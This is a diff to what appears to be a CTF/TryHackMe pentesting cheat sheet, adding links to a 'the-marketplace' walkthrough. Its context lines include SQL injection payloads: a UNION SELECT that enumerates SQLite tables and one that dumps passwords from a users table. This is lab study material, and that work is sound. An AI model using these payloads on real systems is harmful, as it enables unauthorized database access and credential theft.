@@ -135,7 +135,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
 
 ```
 ' union select group_concat(tbl_name),2,3,4  FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
@@ -147,7 +147,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
 
 **Burp**
 
@@ -161,7 +161,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
 
 ```
 ' union select group_concat(password),2,3,4  FROM users -- -
